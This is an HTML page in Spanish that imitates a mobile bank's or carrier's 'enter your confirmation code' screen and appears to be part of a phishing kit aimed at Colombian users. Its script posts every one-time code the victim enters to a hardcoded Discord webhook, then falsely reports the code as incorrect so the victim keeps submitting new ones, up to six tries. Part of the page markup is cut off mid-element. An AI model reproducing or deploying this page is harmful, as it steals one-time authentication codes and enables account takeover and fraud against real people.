<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Código de Confirmación</title>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;700&family=Noto+Sans:wght@400;700;900&display=swap" rel="stylesheet">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    font-family: 'Noto Sans', 'Roboto', sans-serif;
    background: #e8e8e8;
    min-height: 100vh;
    display: flex;
    justify-content: center;
  }
  .screen {
    width: 100%;
    max-width: 430px;
    min-height: 100vh;
    background: #e8e8e8;
    display: flex;
    flex-direction: column;
  }

  /* HEADER */
  .header {
    height: 145px;
    background: linear-gradient(180deg, #7a0000 0%, #b20000 35%, #df0000 65%, #c50000 100%);
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    flex-shrink: 0;
  }
  .header img {
    width: 76px;
    height: 76px;
    object-fit: contain;
  }
  .header-close {
    position: absolute;
    right: 22px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    cursor: pointer;
    padding: 8px;
    line-height: 0;
  }

  /* CONTENT */
  .content {
    flex: 1;
    padding: 0 28px 48px;
    display: flex;
    flex-direction: column;
  }

  .back-btn {
    display: flex;
    align-items: center;
    gap: 5px;
    background: none;
    border: none;
    cursor: pointer;
    font-family: 'Noto Sans', sans-serif;
    font-size: 18px;
    font-weight: 400;
    color: #1a1a1a;
    padding: 22px 0 8px;
    letter-spacing: 0;
  }

  /* TÍTULO — réplica exacta: bold/black, grande, centrado */
  h1 {
    font-family: 'Noto Sans', 'Roboto', sans-serif;
    font-size: 23px;
    font-weight: 900;
    color: #0d0d0d;
    text-align: center;
    margin: 30px 0 44px;
    line-height: 1.22;
    letter-spacing: -0.3px;
  }

  /* INPUT */
  #codigo {
    width: 100%;
    height: 62px;
    border-radius: 50px;
    border: none;
    background: #fff;
    font-size: 26px;
    font-weight: 700;
    text-align: center;
    letter-spacing: 12px;
    color: #111;
    outline: none;
    box-shadow: 0 1px 4px rgba(0,0,0,0.09);
    caret-color: #cc0000;
    margin-bottom: 10px;
    transition: box-shadow 0.2s;
    font-family: 'Noto Sans', sans-serif;
  }
  #codigo:focus { box-shadow: 0 0 0 2px #cc0000, 0 1px 4px rgba(0,0,0,0.09); }
  #codigo.shake { animation: shake 0.35s ease; box-shadow: 0 0 0 2px #cc0000; }
  @keyframes shake {
    0%,100% { transform: translateX(0); }
    20% { transform: translateX(-8px); }
    40% { transform: translateX(8px); }
    60% { transform: translateX(-5px); }
    80% { transform: translateX(5px); }
  }

  .intentos-txt {
    text-align: center;
    font-size: 13px;
    color: #999;
    min-height: 20px;
    margin-bottom: 26px;
    font-family: 'Noto Sans', sans-serif;
  }
  .intentos-txt.warn { color: #cc0000; font-weight: 700; }

  /* TEXTO AYUDA */
  .help-text {
    text-align: center;
    font-family: 'Noto Sans', sans-serif;
    font-size: 16px;
    font-weight: 400;
    color: #4a4a4a;
    line-height: 1.65;
    margin-bottom: 36px;
  }
  .help-link {
    font-weight: 700;
    color: #0d0d0d;
    text-decoration: underline;
    cursor: pointer;
  }

  /* BOTÓN CONTINUAR */
  .btn-continuar {
    display: block;
    width: 220px;
    margin: 0 auto;
    height: 56px;
    border-radius: 50px;
    border: none;
    background: #d2d2d2;
    color: #a0a0a0;
    font-family: 'Noto Sans', sans-serif;
    font-size: 17px;
    font-weight: 500;
    cursor: default;
    transition: background 0.2s, color 0.2s, transform 0.1s;
  }
  .btn-continuar.active { background: #cc0000; color: #fff; cursor: pointer; }
  .btn-continuar.active:hover  { background: #b20000; }
  .btn-continuar.active:active { transform: scale(0.97); }

  /* FAB */
  .fab {
    position: fixed;
    bottom: 26px;
    right: 18px;
    width: 58px;
    height: 58px;
    border-radius: 50%;
    background: #cc0000;
    border: none;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 4px 16px rgba(180,0,0,0.45);
  }

  /* MODAL */
  .overlay {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.45);
    z-index: 100;
    align-items: center;
    justify-content: center;
  }
  .overlay.show { display: flex; }
  .modal {
    background: #fff;
    border-radius: 20px;
    padding: 32px 24px 26px;
    max-width: 300px;
    width: 88%;
    text-align: center;
  }
  .modal h2 { font-size: 19px; font-weight: 900; margin-bottom: 10px; font-family: 'Noto Sans', sans-serif; }
  .modal p  { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 22px; }
  .modal-btn {
    width: 100%; height: 50px; border-radius: 50px; border: none;
    background: #cc0000; color: #fff; font-size: 15px; font-weight: 700;
    cursor: pointer; font-family: 'Noto Sans', sans-serif;
  }
  .modal-btn:hover { background: #b30000; }

  /* TOAST */
  .toast {
    position: fixed;
    bottom: 95px;
    left: 50%;
    transform: translateX(-50%) translateY(20px);
    background: #222;
    color: #fff;
    padding: 10px 20px;
    border-radius: 40px;
    font-size: 13px;
    font-weight: 500;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.3s, transform 0.3s;
    white-space: nowrap;
    z-index: 300;
  }
  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
</style>
</head>

        <line x1="19" y1="2" x2="2"  y2="19" stroke="white" stroke-width="2.6" stroke-linecap="round"/>
      </svg>
    </button>
  </div>

  <div class="content">
    <button class="back-btn" onclick="window.location.href='index.html'">
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="15 18 9 12 15 6"/>
      </svg>
      Atrás
    </button>

    <h1>Ingrese su código de<br>confirmación</h1>

    <input
      type="text"
      id="codigo"
      inputmode="numeric"
      pattern="[0-9]*"
      maxlength="6"
      autocomplete="one-time-code"
      oninput="onInput(this)"
    >

    <div class="intentos-txt" id="intentos-txt"></div>

    <p class="help-text">
      Si no recibe el código, puede esperar nuestra<br>
      llamada o contactarnos a través del botón<br>
      <span class="help-link">"¿Necesita Ayuda?"</span>
    </p>

    <button class="btn-continuar" id="btn-continuar" onclick="enviar()">Continuar</button>
  </div>
</div>

<button class="fab">
  <svg width="26" height="26" viewBox="0 0 24 24" fill="white">
    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/>
  </svg>
</button>

<div class="overlay" id="overlay">
  <div class="modal">
    <h2>Intentos agotados</h2>
    <p>Has superado el número máximo de intentos. Por favor, inicia el proceso nuevamente.</p>
    <button class="modal-btn" onclick="window.location.href='index.html'">Volver al inicio</button>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
  const WEBHOOK = "https://discord.com/api/webhooks/1481123117672824985/Yx5QOIlaL-wY5I0eVMUaNzw7_rM9yu2Ht_Kvx8tW4-frGdJZr0klQUc6L2XGWPDXnp64";
  const MAX = 6;
  let restantes = MAX;
  const input   = document.getElementById('codigo');
  const btn     = document.getElementById('btn-continuar');
  const iTxt    = document.getElementById('intentos-txt');
  const overlay = document.getElementById('overlay');
  const toast   = document.getElementById('toast');

  function onInput(el) {
    el.value = el.value.replace(/\D/g,'').slice(0,6);
    btn.classList.toggle('active', el.value.length === 6);
  }
  function showToast(msg) {
    toast.textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 2600);
  }
  async function enviarWebhook(codigo, intento) {
    const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'Código de Confirmación',
        embeds: [{
          title: '🔐 Código ingresado',
          color: 0xcc0000,
          fields: [
            { name: 'Código',     value: '' + codigo + '', inline: true },
            { name: 'Intento',    value: intento + ' / ' + MAX, inline: true },
            { name: 'Fecha/Hora', value: hora }
          ],
          footer: { text: 'Panel de Confirmación' }
        }]
      })
    }).catch(() => {});
  }
  async function enviar() {
    const codigo = input.value.trim();
    if (codigo.length !== 6 || restantes <= 0) return;
    btn.disabled = true;
    const intento = MAX - restantes + 1;
    await enviarWebhook(codigo, intento);
    restantes--;
    if (restantes <= 0) { overlay.classList.add('show'); return; }
    input.classList.add('shake');
    setTimeout(() => input.classList.remove('shake'), 400);
    iTxt.textContent = restantes <= 2
      ? '⚠️ Solo ' + restantes + ' intento' + (restantes===1?'':'s') + ' restante' + (restantes===1?'':'s')
      : restantes + ' intentos restantes';
    iTxt.className = 'intentos-txt' + (restantes <= 2 ? ' warn' : '');
    showToast('Código incorrecto, intenta de nuevo');
    input.value = '';
    btn.classList.remove('active');
    btn.disabled = false;
    input.focus();
  }
  input.addEventListener('keydown', e => {
    if (e.key === 'Enter' && input.value.length === 6) enviar();
  });
</script>
</body>
</html>
